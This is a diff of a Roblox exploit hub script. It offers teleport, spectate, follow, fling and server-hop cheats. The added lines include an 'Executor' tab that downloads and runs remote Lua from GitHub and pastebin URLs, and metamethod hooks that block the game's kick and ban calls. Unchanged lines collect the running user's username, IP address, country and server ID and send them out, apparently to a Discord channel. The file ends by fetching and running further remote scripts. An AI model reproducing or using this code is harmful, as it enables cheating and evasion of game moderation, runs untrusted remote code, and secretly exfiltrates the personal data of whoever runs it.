-                local cam = workspace.CurrentCamera
-                if player.Character and player.Character:FindFirstChild("Humanoid") then
-                    cam.CameraSubject = player.Character.Humanoid
-                    break
-                end
-            end
-        end
-    end
-end})
-
-for _, player in ipairs(Players:GetPlayers()) do
-    table.insert(Playlist, player.Name)
-end
-
-local TP = Other:CreateDropdown({
-    Name = "Teleport",
-    Options = Playlist,
-    CurrentOption = {},
-    MultipleOptions = false,
-    Flag = "Dropdown1",
-    Callback = function(name)
-        local localPlayer = Players.LocalPlayer
-        local localChar = localPlayer.Character
-        local localHRP = localChar and localChar:FindFirstChild("HumanoidRootPart")
-        if not localHRP then return end
-
-        for _, player in pairs(Players:GetPlayers()) do
-            if player.Name:lower():find(name:lower()) then
-                TargetTp:Set("Player: " ..player.Name)
-                TpToPlayerTarget = player
-                local targetHRP = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
-                if targetHRP then
-                    localHRP.CFrame = targetHRP.CFrame
-                    break
-                end
-            end
-        end
-    end
-})
-
-local WT = Other:CreateDropdown({
-    Name = "Follow",
-    Options = Playlist,
-    CurrentOption = {},
-    MultipleOptions = false,
-    Flag = "Dropdown1",
-    Callback = function(name)
-        for _, player in pairs(Players:GetPlayers()) do
-            if player.Name:lower():find(name:lower()) then
-                TargetFollow:Set("Player: " ..player.Name)
-                local targetHRP = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
-                if targetHRP then
-                    WalkToPlayerTarget = player
-                    break
-                end
-            end
-        end
-    end
-})
-
-local SP = Other:CreateDropdown({
-    Name = "Spectator",
-    Options = Playlist,
-    CurrentOption = {},
-    MultipleOptions = false,
-    Flag = "Dropdown1",
-    Callback = function(name)
-        for _, player in pairs(Players:GetPlayers()) do
-            if player.Name:lower():find(name:lower()) then
-                local cam = workspace.CurrentCamera
-                TargetSp:Set("Player: " ..player.Name)
-                if player.Character and player.Character:FindFirstChild("Humanoid") then
-                    cam.CameraSubject = player.Character.Humanoid
-                    break
-                end
-            end
-        end
-    end
-})
-
-local CPN = Other:CreateDropdown({
-    Name = "Copy Player Name",
-    Options = Playlist,
-    CurrentOption = {},
-    MultipleOptions = false,
-    Flag = "Dropdown1",
-    Callback = function(name)
-        setclipboard(name)
-    end
-})
-
-Other:CreateButton({
-    Name = "Refresh",
-    Callback = function()
-        Playlist = {}
-        for _, player in ipairs(Players:GetPlayers()) do
-            table.insert(Playlist, player.Name)
-        end
-        CPN:Refresh(Playlist)
-        TP:Refresh(Playlist)
-        SP:Refresh(Playlist)
-        WT:Refresh(Playlist)
-    end
-})
-
-Other:CreateToggle({Name = "Enable Following", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
-    CanWalkToPlayer = Value
-end})
-
-Other:CreateButton({Name = "Teleport", Callback = function()
-    player.Character.HumanoidRootPart.CFrame = TpToPlayerTarget.Character.HumanoidRootPart.CFrame
-end})
-
-Other:CreateButton({Name = "Reset Spectator", Callback = function()
-    game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
-end})
-
-Other:CreateSection("Game & Server")
-
-Other:CreateInput({Name = "Game", CurrentValue = "", PlaceholderText = "GameId", RemoveTextAfterFocusLost = true, Callback = function(Value)
-    TeleportService:Teleport(Value)
-end})
-
-Other:CreateInput({Name = "Server", CurrentValue = "", PlaceholderText = "ServerId", RemoveTextAfterFocusLost = true, Callback = function(Value)
-    TeleportService:TeleportToPlaceInstance(game.PlaceId, Value, player)
-end})
-
-Other:CreateButton({Name = "Rejoin", Callback = function()
-    TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
-end})
-
-Other:CreateButton({Name = "Server Hop", Callback = function()
-    local servers = {}
-    local req = game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true")
-    local body = HttpService:JSONDecode(req)
-
-    if body and body.data then
-        for i, v in next, body.data do
-            if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= JobId then
-                table.insert(servers, 1, v.id)
-            end
-        end
-    end
-
-    if #servers > 0 then
-        TeleportService:TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], Players.LocalPlayer)
-    end
-end})
-
-Other:CreateToggle({Name = "Auto Rejoin", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
-    AutoRejoin = Value
-end})
-
-Other:CreateSection("Character")
-
-Other:CreateButton({Name = "Reset", Callback = function()
-    game.Players.LocalPlayer.Character.Humanoid.Health = 0
-end})
-
-local InfiniteJumpEnabled = false
-local InfiniteJumpConnection
-
-Other:CreateToggle({Name = "Infinite Jump", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
-    InfiniteJumpEnabled = Value
-    if Value and not InfiniteJumpConnection then
-        InfiniteJumpConnection = game:GetService("UserInputService").JumpRequest:Connect(function()
-            if InfiniteJumpEnabled then
-                local humanoid = game:GetService("Players").LocalPlayer.Character and game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
-                if humanoid then
-                    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
-                end
-            end
-        end)
-    elseif not Value and InfiniteJumpConnection then
-        InfiniteJumpConnection:Disconnect()
-        InfiniteJumpConnection = nil
-    end
-end})
-
-Other:CreateInput({Name = "Chat", CurrentValue = "", PlaceholderText = "Text", RemoveTextAfterFocusLost = true, Callback = function(txt)
-    if game:GetService('TextChatService').ChatVersion == Enum.ChatVersion.LegacyChatService then
-        game:GetService('ReplicatedStorage'):WaitForChild('DefaultChatSystemChatEvents'):WaitForChild('SayMessageRequest'):FireServer(txt, 'All')
-    else
-        game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(txt)
-    end
-end})
-
-Other:CreateToggle({Name = "Sit", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
-    game.Players.LocalPlayer.Character.Humanoid.Sit = Value
-end})
-
-Other:CreateToggle({Name = "Equip All Toots", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
-    if Value then
-        for _, tools in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
-            if tools:IsA("Tool") then
-                tools.Parent = game.Players.LocalPlayer.Character
-            end
-        end
-    else
-        for _, tools in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
-            if tools:IsA("Tool") then
-                tools.Parent = game.Players.LocalPlayer.Backpack
-            end
-        end
-    end
-end})
-
-Other:CreateSlider({Name = "Pov View", Range = {0, 120}, Increment = 1, Suffix = "Pov", CurrentValue = cam.FieldOfView, Flag = "Slider1", Callback = function(Value)
-    local number = tonumber(Value)
-    if number then
-        cam.FieldOfView = number
-    end
-end})
-
-local Blur = game:GetService("Lighting"):FindFirstChild("Blur")
-if not Blur then
-    Blur = Instance.new("BlurEffect")
-    Blur.Parent = game:GetService("Lighting")
-    Blur.Size = 0
-end
-
-Other:CreateSlider({Name = "Blur", Range = {0, 100}, Increment = 1, Suffix = "Size", CurrentValue = Blur.Size, Flag = "Slider1", Callback = function(Value)
-    local Blur = game:GetService("Lighting"):FindFirstChild("Blur")
-    if not Blur then
-        Blur = Instance.new("BlurEffect")
-        Blur.Parent = game:GetService("Lighting")
-        Blur.Size = 0
-    end
-    Blur.Size = Value
-end})
-
-Other:CreateSection("Game")
-
-Other:CreateButton({Name = "Console", Callback = function()
-    game.StarterGui:SetCore("DevConsoleVisible", true)
-end})
-
-Other:CreateToggle({Name = "Day & Night", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
-    local lighting = game.Lighting
-    if Value then
-        lighting.TimeOfDay = 0
-    else
-        lighting.TimeOfDay = 12
-    end
-end})
-
-Other:CreateSection("Animations & Sounds")
-
-local s = Instance.new("Sound", game.Workspace)
-local a = Instance.new("Animation")
-local AT
-
-Other:CreateInput({Name = "Change Animation Speed", CurrentValue = "", PlaceholderText = "Value", RemoveTextAfterFocusLost = true, Callback = function(Value)
-    speed = tonumber(Value)
-end})
-
-Other:CreateToggle({Name = "Animation Speed", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
-    if Value then
-        local plr = game.Players.LocalPlayer
-        local chr = plr.Character
-        local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
-        RunAnimationSpeed = game:GetService("RunService").Heartbeat:Connect(function()
-            for _, track in pairs(hum:GetPlayingAnimationTracks()) do
-                track:AdjustSpeed(speed)
-            end
-        end)
-    else
-        if RunAnimationSpeed then
-            RunAnimationSpeed:Disconnect()
-            RunAnimationSpeed = nil
-        end
-    end
-end})
-
-Other:CreateToggle({Name = "Freeze Animation", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
-    local animate = game.Players.LocalPlayer.Character.Animate
-    local hum = game.Players.LocalPlayer.Character.Humanoid
-    if Value then
-        animate.Enabled = false
-        for _, track in pairs(hum:GetPlayingAnimationTracks()) do
-            track:AdjustSpeed(0)
-        end
-    else
-        animate.Enabled = true
-        for _, track in pairs(hum:GetPlayingAnimationTracks()) do
-            track:AdjustSpeed(1)
-        end
-    end
-end})
-
-Other:CreateInput({Name = "Load Animation", CurrentValue = "", PlaceholderText = "Animation Id", RemoveTextAfterFocusLost = true, Callback = function(txt)
-    if string.find(txt, "http://www.roblox.com") then
-        a.AnimationId = string.gsub(txt, "http://www.roblox.com/asset/?id=", "rbxassetid://")
-    elseif string.find(txt, "rbxassetid://") then
-    	a.AnimationId = txt
-    else
-        a.AnimationId = "rbxassetid://" ..txt
-    end
-end})
-
-Other:CreateToggle({Name = "Play", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
-    local hum = player.Character.Humanoid
-    if Value then
-        AT = hum:LoadAnimation(a)
-        AT:Play()
-    else
-        if AT then
-            AT:Stop()
-        end
-    end
-end})
-
-Other:CreateInput({Name = "Load Sound", CurrentValue = "", PlaceholderText = "Sound Id", RemoveTextAfterFocusLost = true, Callback = function(txt)
-    if string.find(txt, "http://www.roblox.com") then
-        s.SoundId = string.gsub(txt, "http://www.roblox.com/asset/?id=", "rbxassetid://")
-    elseif string.find(txt, "rbxassetid://") then
-    	s.SoundId = txt
-    else
-        s.SoundId = "rbxassetid://" ..txt
-    end
-end})
-
-Other:CreateToggle({Name = "Play", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
-    if Value then
-        s:Play()
-    else
-        if s.Playing then
-            s:Stop()
-        end
-    end
-end})
-
 local Troll = Window:CreateTab("Troll", 6862780932)
 Troll:CreateSection("Troll")
 
@@ -1495,90 +1523,6 @@ SearchEmote:CreateInput({Name = "Search", CurrentValue = "", PlaceholderText = "
         end
     end
 end})
-
-local Save = Window:CreateTab("Save Script", 105856032975609)
-Save:CreateSection("Save Script")
-
-local up = loadstring(game:HttpGet('https://pastefy.app/aZcja1vg/raw'))()
-local AllScript = {}
-local TextName = ""
-local TextScript = ""
-
-Save:CreateInput({
-    Name = "Load Name",
-    CurrentValue = "",
-    PlaceholderText = "Name",
-    RemoveTextAfterFocusLost = true,
-    Callback = function(txt)
-        TextName = (txt == "" and "Untitled") or txt
-    end
-})
-
-Save:CreateInput({
-    Name = "Load Script",
-    CurrentValue = "",
-    PlaceholderText = "Script",
-    RemoveTextAfterFocusLost = true,
-    Callback = function(txt)
-        TextScript = txt
-    end
-})
-
-Save:CreateButton({
-    Name = "Save",
-    Callback = function()
-        if TextName == "" or TextScript == "" then
-            Rayfield:Notify({
-               Title = "⚠️ Warn!",
-               Content = "Missing name or script",
-               Duration = 6.5,
-               Image = 11745872910,
-            })
-            return
-        end
-        if AllScript[TextName] then
-            Rayfield:Notify({
-               Title = "⚠️ Warn!",
-               Content = "Script already exists",
-               Duration = 6.5,
-               Image = 11745872910,
-            })
-            return
-        end
-
-        AllScript[TextName] = TextScript
-
-        Save:CreateButton({
-            Name = TextName,
-            Callback = function()
-                local success, err = pcall(function()
-                    loadstring(AllScript[TextName])()
-                end)
-            end
-        })
-
-        local content = HttpService:JSONEncode(AllScript)
-        local message = "Update " .. path .. " via API"
-        up:uploadToGitHub(content, message)
-    end
-})
-
-Save:CreateSection("Scripts")
-
-local loaded = up:downloadFromGitHub()
-if not loaded then return end
-
-AllScript = loaded
-for name, script in pairs(AllScript) do
-    Save:CreateButton({
-        Name = name,
-        Callback = function()
-            local success, err = pcall(function()
-                loadstring(script)()
-            end)
-        end
-    })
-end
 
 local GetInfo = Window:CreateTab("Get Info", 13874214925)
 GetInfo:CreateSection("Get Info")
@@ -2069,6 +2013,42 @@ TouchFlingT = Fling:CreateToggle({Name = "Touch Fling", CurrentValue = false, Fl
     end
 end})
 
+task.spawn(function()
+    local Executor = Window:CreateTab("Executor", 110053095881986)
+    Executor:CreateSection("PC")
+    
+    local Executors = {
+        PC = {
+            {N = "Krampus", U = "https://raw.githubusercontent.com/ImNotRox1/Random111x1x1x1/main/txt.lua"},
+            {N = "Electron", U = "https://rawscripts.net/raw/Universal-Script-Electron-UI-Remake-13807"},
+            {N = "Synapse X", U = "https://raw.githubusercontent.com/AZYsGithub/Chillz-s-scripts/main/Synapse-X-Remake.lua"},
+            {N = "KRNL", U = "https://raw.githubusercontent.com/AZYsGithub/Chillz-s-scripts/refs/heads/main/KRNL%20UI%20Remake.lua"},
+            {N = "RC7", U = "https://pastebin.com/raw/sYTvniu7"},
+            {N = "Internal", U = "https://raw.githubusercontent.com/InfernusScripts/Other-Stuff/main/ExecutorInternal.lua"},
+            {N = "Incognito", U = "https://rawscripts.net/raw/Universal-Script-Incognito-UI-Remake-13393"},
+        },
+        Mobile = {
+            {N = "Arceus", U = "https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/Arceus%20X%20V3"},
+            {N = "Cubix", U = "https://github.com/1dontgiveaf/testscript69/raw/main/Cubix"},
+            {N = "Old Delta", U = "https://raw.githubusercontent.com/ElijahGamingRBLX/Roblox-Executor/8536d27eef4eca985572dc30fc146dfd4e55a893/DeltaExecutor.lua"},
+            {N = "Apple-Ware", U = "https://raw.githubusercontent.com/ElijahGamingRBLX/Roblox-Executor/8536d27eef4eca985572dc30fc146dfd4e55a893/DeltaExecutor.lua"},
+        }
+    }
+    
+    for i, v in pairs(Executors.PC) do
+        Executor:CreateButton({Name = v.N, Callback = function()
+            loadstring(game:HttpGet(v.U))()
+        end})
+    end
+    
+    Executor:CreateSection("Mobile")
+    
+    for i, v in pairs(Executors.Mobile) do
+        Executor:CreateButton({Name = v.N, Callback = function()
+            loadstring(game:HttpGet(v.U))()
+        end})
+    end
+end)
 local function sendMessage(message, history, system)
     history = history or {}
     local body = {
@@ -2597,12 +2577,17 @@ task.spawn(function()
                 if Running then
                     StopGetMessage()
                 end
+                if RunAntiBan then
+                    RunAntiBan = false
+                end
+                if RunAntiKick then
+                    RunAntiKick = false
+                end
             end
             break
     	end
     end
 end)
-    local ST = Instance.new("ScreenGui")
     local T = Instance.new("TextButton")
     local Corner = Instance.new("UICorner")
     ST.Name = "Toggle UnHub"
@@ -2643,8 +2628,63 @@ end)
     end
     local InfoSpy = "\nUsername: " ..player.Name .."\nDisplay Name: " ..player.DisplayName .."\nUserId: " ..player.UserId .."\nAccount Age: " ..player.AccountAge .."\nCountry : " .. (api.country or "Unknown") .. " " .. (api.country_code or "") .."\nIP: " ..(api.ip or "Unknown") .."\nServerID : " .. game.JobId .."\nGame : " .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .."\nGameID : " .. game.PlaceId
     sendMessageToDc(InfoSpy, "Information", "https://m.apkshub.com/images/f4/net.hackerbot.hbsiteapp/icon.png")
+    ac1 = hookmetamethod(game, "__namecall", function(self, ...)
+        local method = getnamecallmethod()
+        if RunAntiKick and method:lower() == "kick" and self == game.Players.LocalPlayer then
+            return
+        end
+        return ac1(self, ...)
+    end)
+    
+    X = hookmetamethod(game, "__namecall", function(self, ...)
+       if getnamecallmethod() == "Ban" and RunAntiBan then
+           local eval1 = {false}
+           local eval2 = {false}
+           local args = {...}
+           if debug.validlevel(3) and self.Parent == nil then
+               local stack = debug.getstack(3)
+               local counter = 0
+               local expected;
+               for i,v in pairs(stack) do
+                   if v == game.Players.LocalPlayer.Name or v == "Ban" or v == "Packet" or v == "Network" then
+                       counter = counter + 1
+                   elseif type(v) == "number" then
+                       if type(expected) == "number" then
+                           expected = expected + v
+                       else
+                           expected = v
+                       end
+                   end
+               end
+               if counter == expected then
+                   eval1 = {true, counter+5}
+               end
+           end
+           if eval1[1] then
+               if #args == eval1[2] then
+                   local counter = 0
+                   local outgoingkey;
+                   for i,v in pairs(args) do
+                       if v == game.Players.LocalPlayer.Name or v == "Ban" or v == "Packet" or v == "Network" then
+                           counter = counter + 1
+                       elseif tostring(i) == "userdata: 0x000000001bdfb8ea" then
+                           outgoingkey = v
+                       end
+                       if counter == eval1[2] then
+                           eval2 = {true, outgoingkey}
+                       end
+                   end
+               end
+               if eval2[1] then
+                   game:GetService("NetworkClient"):SetOutgoingKBPSLimit(0, outgoingkey)
+                   game.Players.LocalPlayer:Kick("Game attempted to ban you but was blocked")
+                   return wait(9e9)
+               end
+           end
+       end
+       return X(self, ...)
+    end)
 end)
-
 
 loadstring(game:HttpGet("https://pastefy.app/XUwaJ6e7/raw"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/LEGO89896/Scripts/refs/heads/main/Noob1"))()
